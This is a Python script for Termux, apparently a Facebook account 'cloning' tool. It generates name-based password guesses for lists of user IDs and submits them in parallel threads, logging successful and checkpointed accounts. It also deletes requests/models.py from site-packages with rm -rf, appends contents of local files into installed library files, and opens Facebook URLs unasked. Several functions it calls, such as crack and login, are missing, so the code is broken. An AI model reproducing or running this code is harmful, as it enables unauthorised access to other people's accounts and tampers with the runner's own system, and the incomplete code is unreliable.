#-----------------[ SAGOR-King ]-------------------#
 
import bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ SAGOR-King ]-------------------#
import os, platform, time, sys
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
#------------------[ SAGOR-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
 
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ SAGOR- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
uname = "bal"
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=100068192857834')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://www.facebook.com/profile.php?id=100068192857834")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ███████╗\033[0;92m     ██╗\033[0;91m     ███████╗\033[0;92m       █████╗     \033[0;92m║
║\033[0;91m ╚══███╔╝ \033[0;92m    ██║\033[0;91m     ██╔════╝\033[0;92m       ██╔══██╗   \033[0;92m║
║\033[0;91m   ███╔╝ \033[0;92m     ██║\033[0;91m     ███████╗\033[0;92m       ███████║   \033[0;92m║
║\033[0;91m  ███╔╝ \033[0;92m      ██║\033[0;91m     ╚════██║\033[0;92m       ██╔══██║  \033[0;92m ║
║\033[0;91m ███████╗ \033[0;92m    ██║\033[0;91m     ███████║\033[0;92m       ██║  ██║   \033[0;92m║
║\033[0;91m ╚══════╝  \033[0;92m   ╚═╝\033[0;91m     ╚══════╝\033[0;92m       ╚═╝  ╚═╝   \033[0;92m║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
\x1b[1;90m█\033[1;32m══\x1b[1;91m══zisa khan\033[1;32m══\033[1;31m══\x1b[1;94m═█\033[1;32m══\x1b[1;91m══zisa khan\033[1;32m══\033[1;31m═══\x1b[1;95m█
\x1b[1;96m█[\033[1;99m✔\033[1;97m]OWNER          \033[1;91m█ \033[1;97mSAGOR KHAN ZISA  \x1b[1;95m█
\x1b[1;95m█[\033[1;98m✔\033[1;97m]TOOL           \033[1;91m█ \033[1;97mTERMUX SET-UP    \x1b[1;93m█
\x1b[1;93m█[\033[1;32m✔\033[1;97m]VERSION        \033[1;91m█ \033[38;5;208mMAX.             \x1b[1;96m█
\x1b[1;90m█\033[1;32m══\x1b[1;91m══zisa khan\033[1;32m══\033[1;31m══\x1b[1;94m═\x1b[1;95m█══\x1b[1;91m══zisa khan\033[1;32m══\033[1;31m═══\x1b[1;95m█"""
os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
FUCKING_KEY =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m inter kujhbi \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  SAGOR,  King,  Tools"')
pass

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mSAGOR         """)
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mNILOY""")
    print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mFARHAN  """)
    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
    print('\033[0;97m=================')
    SAGOR = input('\x1b[1;92m[+] CHOOSE: ')
    if SAGOR in ['111']:
        login()
        dump_massal()
    elif SAGOR in ['1']:
        crack_file()
    elif SAGOR in ['2','02']:
        niloybypass()
    elif SAGOR in ['3','03']:
        farhan()
    elif SAGOR in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
    print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
    print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[97;1m[\033[92;1m•\033[97;1m]CHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\033[0;91m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\033[0;91m==================')
            geeh = input(' \033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[97;1m[\033[92;1m•\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\033[0;91m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\033[0;91m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f'\033[97;1m[\033[92;1m•\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;91m==================')
    os.system('espeak -a 300 " your file name"')
    print('bypass trying ')
    o = '/data/data/com.termux/files/home/BYPASS-KING/apruval.txt'
    try:lin = open(o).read()
    finally:  
        open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'a').write(lin)
    for xid in lin:
        id.append(xid)
    setting()
 #-----------------niloy------------------------#
def niloybypass():
    print('\033[0;91m==================')
    os.system('espeak -a 300 " your file name"')
    animation('\033[1;32m[\033[95m•\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[32m]bypass trying \x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m\x1b[1;97mZI\033[95mSA\033[32mKH\033[93mAN\x1b[1;92m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[33•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97mZI\033[95mSA\033[32mKH\033[93mAN\x1b[1;92m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m\x1b[1;93m•\x1b[1;92m•\x1b[1;91m•\x1b[1;97m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\x1b[1;92m•\033[93m•\033[93m•\x1b[1;91m•\033[95m•\033[32m•\033[95m•\x1b[1;91m')
    o = '/data/data/com.termux/files/home/BYPASS-KING/niloyruval.txt'
    try:lin = open(o).read()
    finally:  
        open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/models.py', 'a').write(lin)
    for xid in lin:
        id.append(xid)
    setting()
    #-----------farhan-----------------------#
def farhan():
    print('\033[0;91m==================')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;32mbypass trying ')
    o = '/data/data/com.termux/files/home/BYPASS-KING/farhanapruval.txt'
    try:lin = open(o).read()
    finally:  
        open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/models.py', 'a').write(lin)
    for xid in lin:
        id.append(xid)
    setting()
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    animation('\033[0;91m====\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m===BYFUCK DONE BY MR \x1b[1;97mZI\033[95mSA\033[32mKH\033[93mAN\x1b[1;92m SAGOR========\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m\033[95m==============')
    hu = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    if hu in ['cfjcgi','ggydycud1']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2gffx','0hcfj2']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['hhff3','0tggf3']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    os.system("xdg-open https://www.facebook.com/profile.php?id=100068192857834")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
    print('\033[0;97m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python nono.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()